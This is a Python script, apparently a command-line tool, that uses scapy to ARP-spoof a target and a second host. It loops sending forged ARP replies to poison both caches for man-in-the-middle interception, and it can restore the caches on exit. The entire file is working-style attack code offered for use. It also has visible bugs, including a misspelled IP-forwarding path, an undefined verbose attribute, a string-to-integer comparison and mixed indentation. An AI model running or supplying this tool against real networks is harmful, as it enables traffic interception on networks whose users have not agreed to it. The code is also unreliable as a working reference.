from scapy.all import *
import os
import sys
import argparse

class Arp_spoof:

#the ipstl variable is the spoofed ip, target is the ip of the target machine
	def __init__(self, ipstl, target):
		self.ipstl = ipstl
		self.target = target
	
	def __call__(self):
		ipstl= self.ipstl
		target= self.target
		try:
			while True:
				self.ARPSpoofing(ipstl, target)
				self.ARPSpoofing(target, ipstl)
				time.sleep(2)
		except KeyboardInterrupt:
			print("\n[+] Ctl+C pressed, Stoping Arp spoofing...")
			print("[+] Restauring the target Arp cache...")
			self.restore(ipstl, target)
			self.restore(target,ipstl)
			print("[*] Arp cache restaured Successfuly!!!")
	
	# Enables routing in linux distribution	
	def routing_linux(self):
		with open("/proc/sys/net/ipv4/ip_forward") as fs:
			if fs.read() == 1:
				return
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forword")

	#enables routing on linux
	def enable_routing(self):
		self.routing_linux()
		if self.verbose:
			print("[*] IP Routing enabled.")

	def getmac(self,ip):
		admac,_ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=3, verbose = False)
		if admac:
			return(admac[0][1].hwsrc)

	def ARPSpoofing(self,ipstl,target):
		paquet = ARP(op=2, hwdst=self.getmac(target), psrc=ipstl, pdst=target)
		send(paquet, verbose = True)
	
	#this function restore the target arp cache
	def restore(self,destination_ip, source_ip):
		destination_mac = self.getmac(destination_ip)
		source_mac = self.getmac(source_ip)
		packet = ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
		
		send(packet, verbose = False)

def main(args):
	try:
		arpspoof = Arp_spoof(args.ipstl, args.target)
		arpspoof()
	except KeyboardInterrupt:
		print("[*] Stopping Arpspoofing....")

def parse_args(args):
        parser = argparse.ArgumentParser()
	parser.add_argument("-s", dest="ipstl", help="The spoofed IP address")
	parser.add_argument("-d", dest="target", help="The target Ip address")
	arg = parser.parse_args()
	if len(sys.argv) < 2:
		parser.print_help()
		sys.exit(1)
	return parser.parse_args(args)
if __name__ == '__main__':
	try:
		main(parse_args(sys.argv[1:]))
	except OSError:
		print("[-] programme interrupted by an os error!!!")